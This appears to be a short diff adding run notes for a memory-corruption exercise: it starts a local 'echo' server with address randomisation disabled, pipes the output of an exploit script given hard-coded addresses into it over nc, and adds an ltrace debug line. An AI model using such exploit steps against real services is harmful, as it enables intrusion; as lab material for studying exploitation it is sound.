@@ -1,0 +1,6 @@
+setarch x86_64 -R ./echo 9000
+
+python3 exploit_c.py 0x080490b0 0x0804941c 0xffffcc20 | nc localhost 9000
+
+# debug:
+setarch x86_64 -R ltrace ./echo 9000
